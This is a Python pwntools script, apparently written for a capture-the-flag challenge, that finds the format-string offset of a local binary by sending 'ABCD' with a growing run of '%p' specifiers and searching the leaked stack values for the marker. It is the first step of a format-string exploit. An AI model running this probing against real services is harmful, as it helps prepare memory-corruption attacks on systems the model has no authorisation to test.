#!/usr/bin/env python
#-*- coding:utf-8 -*-

# Author: I0gan
# Team  : D0g3

from pwn import *

context.log_level='debug'
#context.terminal = ['konsole', '-x', 'bash', 'c']
#context.terminal = 'konsole'
#context(arch = 'i386', os = 'linux', log_level='debug')
#context(arch = 'amd64', os = 'linux', log_level='debug')

exeFile  = "./4th-CyberEarth"

remoteIp = "0.0.0.0"
remotePort = 0

LOCAL = 1
maxLen = 0x30
minLen = 0x10
preSendStr = ''
recvStr = ''

r   =  lambda x : io.recv(x)
ra  =  lambda   : io.recvall()
rl  =  lambda   : io.recvline(keepends = True)
ru  =  lambda x : io.recvuntil(x, drop = True)
sl  =  lambda x : io.sendline(x)
sa  =  lambda x, y : io.sendafter(x, y)
sla =  lambda x, y : io.sendlineafter(x, y)
ia  =  lambda : io.interactive()
c   =  lambda : io.close()
pd32  = lambda x : p32(x).decode() #python3 not surport str + bytes
pd64  = lambda x : p64(x).decode()
li    = lambda x : log.info(x)
db    = lambda   : gdb.attach(io)

def calc(payload):
	if(preSendStr == ''):
		sl(payload)
	else:
		sla(preSendStr, payload)

	if(recvStr != ''):
		ru(recvStr)

	recv = ra()
	infos = recv.split(', ')
	offset = -1
	for info in infos:
		li(info)
		offset += 1
		if('0x44434241' == info):
			return offset	
	#pause()
	return -1

#--------------------------Main-----------------------------
if __name__ == '__main__':
	
	length = 0;
	payload = 'ABCD' + ', %p' * minLen
	while(True):
		if LOCAL:
			io = process(exeFile)	
		else:
			io = remote(remoteIp, remotePort)
		offset = calc(payload) 
		if(-1 != offset):
			li('---------------------------------------------')
			li('\noffset:' + str(offset))	
			io.close()
			break
		io.close()
		payload += ', %p'	
		length += 1

		if(length > maxLen):
			li('---------------------------------------------')
			li('not found! maxLen too litile')
			io.close
			break

